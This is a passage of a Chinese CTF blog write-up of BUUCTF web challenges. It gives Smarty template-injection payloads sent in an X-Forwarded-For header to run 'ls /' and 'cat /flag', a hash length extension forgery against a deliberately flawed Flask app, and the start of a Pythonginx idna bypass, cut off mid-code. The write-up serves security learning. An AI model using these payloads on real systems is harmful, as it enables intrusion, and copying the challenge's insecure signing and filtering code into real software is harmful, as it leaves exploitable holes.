<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>buuctf_web部分刷题记录_PART2 | 逃    避    現    實</title><meta name="keywords" content="CTF-Web"><meta name="author" content="1ustinianus"><meta name="copyright" content="1ustinianus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="我是菜鸡">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf_web部分刷题记录_PART2">
<meta property="og:url" content="http://gswanx.github.io/post/4f3ccb8a.html">
<meta property="og:site_name" content="逃    避    現    實">
<meta property="og:description" content="我是菜鸡">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://gswanx.github.io/img/headddd.jpg">
<meta property="article:published_time" content="2022-10-22T13:19:16.000Z">
<meta property="article:modified_time" content="2022-10-27T03:47:59.841Z">
<meta property="article:author" content="1ustinianus">
<meta property="article:tag" content="CTF-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://gswanx.github.io/img/headddd.jpg"><link rel="shortcut icon" href="/img/17150526893.png"><link rel="canonical" href="http://gswanx.github.io/post/4f3ccb8a"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buuctf_web部分刷题记录_PART2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-27 11:47:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/title.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/headddd.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/754566.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逃    避    現    實</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buuctf_web部分刷题记录_PART2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-22T13:19:16.000Z" title="发表于 2022-10-22 21:19:16">2022-10-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-27T03:47:59.841Z" title="更新于 2022-10-27 11:47:59">2022-10-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/%E5%88%B7%E9%A2%98/">刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">15.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>74分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="buuctf_web部分刷题记录_PART2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="smarty-SSTI-Web11"><a href="#smarty-SSTI-Web11" class="headerlink" title="[smarty-SSTI]Web11"></a>[smarty-SSTI]Web11</h1><p>要素察觉?<img src="/images/buuctf-web2/image-20221022212305508.png" alt="image-20221022212305508"></p>
<p>根据网站上的提示,加<code>XFF</code>头,其内容会直接回显在网页上</p>
<img src="/images/buuctf-web2/image-20221022212644603.png" alt="image-20221022212644603" style="zoom:67%;" />

<p>确信是<code>smarty</code>的<code>SSTI</code>了:</p>
<img src="/images/buuctf-web2/image-20221022212811607.png" alt="image-20221022212811607" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;$smarty.version&#125;   查看smarty版本</span><br><span class="line">3.1.30</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;ls /&quot;)&#125;&#123;/if&#125; 执行系统命令</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web2/image-20221022213108197.png" alt="image-20221022213108197" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;cat /flag&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221022213204740.png" alt="image-20221022213204740"></p>
<br>

<hr>
<br>

<h1 id="哈希长度扩展攻击-SSRF-Me"><a href="#哈希长度扩展攻击-SSRF-Me" class="headerlink" title="[哈希长度扩展攻击]SSRF Me"></a>[哈希长度扩展攻击]SSRF Me</h1><p>这题给了提示,<code>flag</code>在<code>./flag.txt</code>中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment"># 获得GET中传的参数&quot;param&quot;</span></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从这里开始</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment"># 获得cookie中的参数&quot;action&quot;</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment"># 获得GET中传的参数&quot;param&quot;</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment"># 获得cookie中的参数&quot;sign&quot;</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)): <span class="comment"># 对GET中传的参数&quot;param&quot;进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) <span class="comment"># 创建一个新的对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec()) <span class="comment"># 对param进行扫描,并返回结果</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>sign</code>&#x3D;  系统随机生成的<code>secret_key</code>值 + 用户输入的<code>param</code>(要读取的文件) + <code>action</code>    一起进行md5计算</p>
<p>直接访问<code>/geneSign</code>,输出了一段<code>sign</code>值:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">591f154875e114faeb2e2388f71e6919</span><br></pre></td></tr></table></figure>

<p>访问<code>/geneSign</code>,<code>param</code>传<code>flag.txt</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">输出:d4bd0b631614327be0367efa305057e5</span><br></pre></td></tr></table></figure>

<p>访问<code>/De1ta</code>时, 73行创建一个新的<code>task</code>对象,此时 <code>self.sign</code>来自请求<code>/De1ta</code>时 <code>cookie</code>中的值,<strong>这个值需要我们自己抓包添加</strong></p>
<p>然后<code>checkSign</code>的另一个<code>Sign</code>通过<code>getSign</code>来获得, 通过了检测才能往下进行</p>
<p>也就是说<code>Cookie</code>中的<code>sign</code>值, 必须等于由<code>secret_key</code> +<code> param</code> + <code>action</code>  计算出来的<code>sign</code>值才行</p>
<p>那么如果<code>param=flag.txt</code>,那在<code>cookie</code>中添加我们前面访问<code>/geneSign</code>得到的那个值就行,然后<code>cookie</code>中的<code>action</code>传<code>scan</code></p>
<p>可利用点应该在82行<code>return urllib.urlopen(param).read()[:50]</code>,添加上面的参数并访问<code>/De1ta</code>时,服务器通过检测就会去读取<code>param</code>的内容</p>
<p><img src="/images/buuctf-web2/image-20221023101155575.png" alt="image-20221023101155575"></p>
<p>读取成功,但现在问题是如何将<code>action</code>改为<code>read</code>来获得读取结果</p>
<p>(61行<code>action</code>的值是固定为<code>scan</code>的,所以我们访问<code>/geneSign</code>无法获得<code>action=read</code>时的<code>sign</code>值)</p>
<p>注意到代码中对执行<code>scan</code>还是<code>read</code>进行检测时,用的是 <code>if xx in action</code> 不是严格地去查询<code>action</code>的值是否等于某一项</p>
<p>那么如果访问<code>/De1ta</code>时将<code>action</code>设置为: <code>scanread</code> ,只要通过了<code>sign</code>的检测,就可以执行<code>read</code></p>
<p>利用<code>getsign</code>中字符串拼接的特性,可以获得这个<code>sign</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">c43782860279626e3bdd009573349473</span><br><span class="line">=md5(secert_key +&quot;flag.txtread&quot;+&quot;scan&quot;)=md5(secert_key +&quot;flag.txtreadscan&quot;)=md5(secert_key +&quot;flag.txt&quot;+&quot;readscan&quot;)</span><br></pre></td></tr></table></figure>

<p>将这个值添加进去就能够读取到<code>flag</code>了</p>
<p><img src="/images/buuctf-web2/image-20221023104440712.png" alt="image-20221023104440712"></p>
<p>这里还可以通过<code>hashpump</code>工具进行哈希长度扩展攻击:</p>
<blockquote>
<p>如果一个应用程序是这样操作的：</p>
<ol>
<li>准备了一个密文和一些数据构造成一个字符串，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature&#x2F;签名）</li>
<li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li>
<li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li>
</ol>
<p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出<code>&#123;secret || data || attacker_controlled_data&#125;</code>的哈希值<em>。</em></p>
</blockquote>
<p>例如本题中的密文就是<code>secret_key</code></p>
<p>目前掌握的的是<code>md5(secret_key+ &quot;flag.txtscan&quot;)</code>的值,那么我们可以通过工具获得<code>md5(secret_key+ flag.txtscan+read)</code>的值</p>
<p>这样如果再从<code>action</code>中传 <code>scanread</code> 就可以成功执行<code>read</code>功能了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali㉿kali)-[~/Desktop/HashPump]</span><br><span class="line">└─$ hashpump   </span><br><span class="line">Input Signature: d4bd0b631614327be0367efa305057e5</span><br><span class="line">Input Data: flag.txtscan  (本来追加在secret_key后面的已知数据)</span><br><span class="line">Input Key Length: 16  (secret_key的长度)</span><br><span class="line">Input Data to Add: read  (为了计算新的sign值,我们希望添加的新数据)</span><br><span class="line">aeccfcf28d2da89a3c8581a6c90d1842  (计算结果,新的sign值)</span><br><span class="line">flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read  (新的secret_key后面的已知数据)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="简单-Futurella"><a href="#简单-Futurella" class="headerlink" title="[简单]Futurella"></a>[简单]Futurella</h1><p>这啥…  除了下面这个看起来有点像flag</p>
<img src="/images/buuctf-web2/image-20221023155639056.png" alt="image-20221023155639056" style="zoom:67%;" />



<p>查看源码直接出flag…….</p>
<br>

<hr>
<br>

<h1 id="idna规范化字符-nginx配置文件-urlparse-Pythonginx"><a href="#idna规范化字符-nginx配置文件-urlparse-Pythonginx" class="headerlink" title="[idna规范化字符,nginx配置文件,urlparse]Pythonginx"></a>[idna规范化字符,nginx配置文件,urlparse]Pythonginx</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 获取域名</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line"><span class="comment"># 前面两次检测host中有没有 suctf.cc</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 这一句用于处理非ascii字符,将其规范化成ascii字符</span></span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)  <span class="comment"># 将host的按照.分割开之后,各自编码再用.连接起来</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> 